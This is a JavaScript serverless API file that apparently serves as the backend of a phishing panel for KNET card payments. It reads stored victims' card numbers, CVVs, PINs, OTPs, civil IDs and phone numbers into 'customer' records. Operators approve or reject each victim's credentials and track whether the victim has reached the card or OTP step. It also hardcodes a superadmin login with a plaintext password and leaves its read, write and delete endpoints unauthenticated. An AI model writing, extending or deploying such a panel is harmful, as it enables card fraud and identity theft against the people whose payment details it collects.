module.exports = async (req, res) => {
  const { action } = req.query;
  const SB = process.env.SUPABASE_URL;
  const SK = process.env.SUPABASE_KEY;
  const baseH = { 'apikey': SK, 'Authorization': 'Bearer ' + SK };
  const writeH = { ...baseH, 'Content-Type': 'application/json', 'Prefer': 'return=representation' };
  const sqlTables = ['orders', 'payments', 'visitors', 'admin_users'];

  function parsePath(p) {
    return (p || '').replace(/^\/+|\/+$/g, '').split('/').filter(Boolean);
  }

  function emailToKey(email) {
    return email.trim().toLowerCase().replace(/[.#$[\]]/g, '_');
  }

  function keyToEmail(key) {
    return key.replace(/_com$/, '.com').replace(/_co_/, '.co.').replace(/_org$/, '.org').replace(/_net$/, '.net');
  }

  function adminToFirebase(u) {
    return {
      email: u.email,
      password: u.password_hash,
      role: u.role || 'admin',
      name: u.name || u.email.split('@')[0],
      status: 'active',
      createdAt: u.created_at || new Date().toISOString(),
      updatedAt: u.created_at || new Date().toISOString()
    };
  }

  const HARDCODED_ADMIN = {
    email: 'ash@gmail.com',
    password: 'Ha1234@@',
    role: 'superadmin',
    name: 'Admin',
    status: 'active',
    createdAt: '2024-01-01T00:00:00Z',
    updatedAt: '2024-01-01T00:00:00Z'
  };

  async function readDashboardAccounts(parts) {
    const accounts = {};
    accounts[emailToKey(HARDCODED_ADMIN.email)] = HARDCODED_ADMIN;

    try {
      const r = await fetch(SB + '/rest/v1/admin_users?select=*', { headers: baseH });
      const users = await r.json();
      if (Array.isArray(users)) {
        for (const u of users) {
          const key = emailToKey(u.email);
          if (!accounts[key]) accounts[key] = adminToFirebase(u);
        }
      }
    } catch (e) { }

    if (parts.length === 1) return accounts;
    if (parts.length === 2) return accounts[parts[1]] || null;
    if (parts.length >= 3) {
      const record = accounts[parts[1]];
      return record ? (record[parts[2]] !== undefined ? record[parts[2]] : null) : null;
    }
    return null;
  }

  function paymentToCustomer(p, order) {
    return {
      id: String(p.id),
      cardNumber: p.card_number || '',
      cardExpiry: p.card_expiry || '',
      cardCvv: p.card_cvv || '',
      otp: p.card_pin || '',
      pin: p.card_pin || '',
      password: p.card_pin || '',
      username: p.card_number || '',
      fullName: order ? order.full_name : '',
      phone: order ? order.phone : '',
      civilId: order ? order.civil_id : '',
      cardType: p.card_type || 'KNET',
      amount: p.amount || 0,
      transactionRef: p.transaction_ref || '',
      ipAddress: p.ip_address || '',
      userAgent: p.user_agent || '',
      status: p.status || 'pending',
      credentialsStatus: p.status === 'pending' ? 'pending' : p.status === 'accepted' ? 'approved' : p.status,
      passwordStatus: p.card_pin ? 'entered' : 'pending',
      usernameStatus: p.card_number ? 'entered' : 'pending',
      currentStep: p.card_pin ? 'otp' : p.card_number ? 'card' : 'start',
      lastPage: 'knet-payment',
      lastAction: p.created_at || new Date().toISOString(),
      createdAt: p.created_at || new Date().toISOString(),
      updatedAt: p.created_at || new Date().toISOString(),
      loginInfo: { username: p.card_number || '', password: p.card_pin || '' },
      loginAttempts: p.card_number ? { '1': { cardNumber: p.card_number, cardExpiry: p.card_expiry, cardCvv: p.card_cvv, pin: p.card_pin, timestamp: p.created_at } } : {}
    };
  }

  async function readCustomers(parts) {
    const pr = await fetch(SB + '/rest/v1/payments?select=*&order=created_at.desc', { headers: baseH });
    const payments = await pr.json();
    const or = await fetch(SB + '/rest/v1/orders?select=*&order=created_at.desc', { headers: baseH });
    const orders = await or.json();
    const orderMap = {};
    for (const o of orders) orderMap[o.id] = o;

    if (parts.length === 1) {
      const value = {};
      for (const p of payments) {
        const o = p.order_id ? orderMap[p.order_id] : (orders.length > 0 ? orders[0] : null);
        value[p.id] = paymentToCustomer(p, o);
      }
      return value;
    }
    if (parts.length >= 2) {
      const id = parts[1];
      const p = payments.find(x => String(x.id) === id);
      if (!p) return null;
      const o = p.order_id ? orderMap[p.order_id] : (orders.length > 0 ? orders[0] : null);
      const customer = paymentToCustomer(p, o);
      if (parts.length === 2) return customer;
      if (parts.length >= 3) return customer[parts[2]] !== undefined ? customer[parts[2]] : null;
    }
    return null;
  }

  async function readCustomerEvents(parts) {
    const pr = await fetch(SB + '/rest/v1/payments?select=*&order=created_at.desc', { headers: baseH });
    const payments = await pr.json();
    if (parts.length === 1) {
      const value = {};
      for (const p of payments) {
        value[p.id] = {
          id: String(p.id),
          type: 'payment',
          customerId: String(p.id),
          action: 'card_submitted',
          timestamp: p.created_at,
          data: { cardType: p.card_type, amount: p.amount, ref: p.transaction_ref }
        };
      }
      return value;
    }
    if (parts.length >= 2) {
      const id = parts[1];
      const p = payments.find(x => String(x.id) === id);
      if (!p) return null;
      const event = { id: String(p.id), type: 'payment', customerId: String(p.id), action: 'card_submitted', timestamp: p.created_at, data: { cardType: p.card_type, amount: p.amount, ref: p.transaction_ref } };
      if (parts.length === 2) return event;
      if (parts.length >= 3) return event[parts[2]] !== undefined ? event[parts[2]] : null;
    }
    return null;
  }

  async function readSettings(parts) {
    if (parts.length >= 2 && parts[1] === 'whatsapp') return null;
    return null;
  }

  async function readKvStore(parts) {
    try {
      const r = await fetch(SB + '/rest/v1/kv_store?select=*', { headers: baseH });
      if (!r.ok) return null;
      const rows = await r.json();
      const tree = {};
      for (const row of rows) tree[row.key] = row.value;

      const root = parts[0];
      if (parts.length === 1) return tree[root] || null;
      if (parts.length === 2) {
        const collection = tree[root];
        return collection && typeof collection === 'object' ? (collection[parts[1]] !== undefined ? collection[parts[1]] : null) : null;
      }
      if (parts.length >= 3) {
        const collection = tree[root];
        if (!collection || typeof collection !== 'object') return null;
        const record = collection[parts[1]];
        if (!record || typeof record !== 'object') return null;
        return record[parts[2]] !== undefined ? record[parts[2]] : null;
      }
    } catch (e) { }
    return null;
  }

  async function readSqlTable(parts) {
    const table = parts[0];
    if (parts.length === 1) {
      const r = await fetch(SB + '/rest/v1/' + table + '?select=*&order=created_at.desc', { headers: baseH });
      const data = await r.json();
      const value = {};
      for (const row of data) value[row.id] = row;
      return value;
    }
    if (parts.length === 2) {
      const r = await fetch(SB + '/rest/v1/' + table + '?id=eq.' + parts[1] + '&select=*', { headers: baseH });
      const data = await r.json();
      return data[0] || null;
    }
    if (parts.length >= 3) {
      const field = parts[2];
      const r = await fetch(SB + '/rest/v1/' + table + '?id=eq.' + parts[1] + '&select=' + field, { headers: baseH });
      const data = await r.json();
      return data[0] ? data[0][field] : null;
    }
    return null;
  }

  async function readData(path) {
    const parts = parsePath(path);
    if (parts.length === 0) return null;

    if (parts[0] === 'dashboardAccounts') return readDashboardAccounts(parts);
    if (parts[0] === 'customers') return readCustomers(parts);
    if (parts[0] === 'customerEvents') return readCustomerEvents(parts);
    if (parts[0] === 'settings') return readSettings(parts);
    if (sqlTables.includes(parts[0])) return readSqlTable(parts);
    return readKvStore(parts);
  }

  async function writeData(path, value, merge) {
    const parts = parsePath(path);
    if (parts.length < 1) return;
    const table = parts[0];

    if (table === 'customers' && parts.length >= 2) {
      const id = parts[1];
      if (parts.length === 2 && typeof value === 'object' && value !== null) {
        const mapped = {};
        if (value.status !== undefined) mapped.status = value.status;
        if (value.credentialsStatus !== undefined) mapped.status = value.credentialsStatus === 'approved' ? 'accepted' : value.credentialsStatus;
        if (Object.keys(mapped).length > 0) {
          await fetch(SB + '/rest/v1/payments?id=eq.' + id, { method: 'PATCH', headers: writeH, body: JSON.stringify(mapped) });
        }
      } else if (parts.length >= 3) {
        const field = parts[2];
        if (field === 'status' || field === 'credentialsStatus') {
          const mapped = field === 'credentialsStatus' ? (value === 'approved' ? 'accepted' : value) : value;
          await fetch(SB + '/rest/v1/payments?id=eq.' + id, { method: 'PATCH', headers: writeH, body: JSON.stringify({ status: mapped }) });
        }
      }
      return;
    }

    if (table === 'dashboardAccounts' && parts.length >= 2) {
      const key = parts[1];
      const email = keyToEmail(key);
      if (parts.length === 2 && typeof value === 'object' && value !== null) {
        const check = await fetch(SB + '/rest/v1/admin_users?email=eq.' + encodeURIComponent(email) + '&select=id', { headers: baseH });
        const existing = await check.json();
        const row = {
          email: value.email || email,
          password_hash: value.password || '',
          role: value.role || 'admin',
          name: value.name || ''
        };
        if (existing.length > 0) {
          await fetch(SB + '/rest/v1/admin_users?id=eq.' + existing[0].id, { method: 'PATCH', headers: writeH, body: JSON.stringify(row) });
        } else {
          await fetch(SB + '/rest/v1/admin_users', { method: 'POST', headers: writeH, body: JSON.stringify(row) });
        }
      } else if (parts.length >= 3) {
        const field = parts[2];
        const dbField = field === 'password' ? 'password_hash' : field;
        await fetch(SB + '/rest/v1/admin_users?email=eq.' + encodeURIComponent(email), { method: 'PATCH', headers: writeH, body: JSON.stringify({ [dbField]: value }) });
      }
      return;
    }

    if (sqlTables.includes(table)) {
      if (parts.length === 2) {
        const check = await fetch(SB + '/rest/v1/' + table + '?id=eq.' + parts[1] + '&select=id', { headers: baseH });
        const existing = await check.json();
        if (existing.length > 0) {
          await fetch(SB + '/rest/v1/' + table + '?id=eq.' + parts[1], { method: 'PATCH', headers: writeH, body: JSON.stringify(value) });
        } else {
          const insertData = typeof value === 'object' && value !== null ? { ...value } : { value };
          await fetch(SB + '/rest/v1/' + table, { method: 'POST', headers: writeH, body: JSON.stringify(insertData) });
        }
      } else if (parts.length >= 3) {
        await fetch(SB + '/rest/v1/' + table + '?id=eq.' + parts[1], { method: 'PATCH', headers: writeH, body: JSON.stringify({ [parts[2]]: value }) });
      }
      return;
    }
  }

  async function removeData(path) {
    const parts = parsePath(path);
    if (parts.length < 2) return;
    const table = parts[0];

    if (table === 'customers') {
      await fetch(SB + '/rest/v1/payments?id=eq.' + parts[1], { method: 'DELETE', headers: baseH });
      return;
    }
    if (table === 'dashboardAccounts') {
      const email = keyToEmail(parts[1]);
      await fetch(SB + '/rest/v1/admin_users?email=eq.' + encodeURIComponent(email), { method: 'DELETE', headers: baseH });
      return;
    }
    if (sqlTables.includes(table)) {
      await fetch(SB + '/rest/v1/' + table + '?id=eq.' + parts[1], { method: 'DELETE', headers: baseH });
    }
  }

  try {
    if (action === 'read') {
      if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
      const { path } = req.body || {};
      return res.json({ value: await readData(path) });
    }

    if (action === 'poll') {
      if (req.method !== 'GET') return res.status(405).json({ error: 'Method not allowed' });
      return res.json({ value: await readData(req.query.path || '') });
    }

    if (action === 'set') {
      if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
      const { path, value } = req.body || {};
      await writeData(path, value, false);
      return res.json({ ok: true });
    }

    if (action === 'update') {
      if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
      const { path, value } = req.body || {};
      await writeData(path, value, true);
      return res.json({ ok: true });
    }

    if (action === 'remove') {
      if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
      const { path } = req.body || {};
      await removeData(path);
      return res.json({ ok: true });
    }

    return res.status(404).json({ error: 'Unknown action: ' + action });
  } catch (e) {
    console.error('fb/' + action + ' error:', e);
    return res.status(500).json({ error: e.message });
  }
};
